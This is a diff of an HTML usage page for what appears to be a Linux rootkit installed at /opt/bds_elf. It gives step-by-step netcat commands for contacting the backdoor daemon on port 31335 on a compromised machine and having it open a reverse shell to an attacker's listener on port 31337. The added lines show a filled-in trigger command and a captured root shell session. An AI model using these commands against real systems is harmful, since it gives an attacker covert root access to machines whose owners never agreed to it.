@@ -100,7 +100,6 @@ nc server ip 31335
 then type : 
 /opt/bds_elf/bds_bc <your ip address>
 </pre>  
-  
 Wait a few seconds and you will get reverse shell port connection from your target server.
 <br>
 Example :
@@ -114,9 +113,19 @@ Open terminal on your local machine and set up port listener on port 31337:
 Open another terminal and connect to daemon on target machine (which you have installed rootkit) :
 <pre>
 robotsoft@robotsoft:~$ nc 192.168.43.36 31335
-CMD : /opt/bds_elf/bds_bc 
-
+CMD :/opt/bds_elf/bds_bc 192.168.43.230
+CMD :
 </pre>  
 Back on your previous netcat listener, you will receive a reverse shell connection : 
-
+<pre>
+root@robotsoft:~# nc -l -p 31337 -v
+Listening on 0.0.0.0 31337
+Connection received on 192.168.43.36 42012
+Linux robotsoft-virtualbox 6.2.0-20-generic #20-Ubuntu SMP PREEMPT_DYNAMIC Thu Apr  6 07:48:48 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+id
+uid=0(root) gid=0(root) groups=0(root)
+uname -a
+Linux robotsoft-virtualbox 6.2.0-20-generic #20-Ubuntu SMP PREEMPT_DYNAMIC Thu Apr  6 07:48:48 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+</pre>
 </p>
+
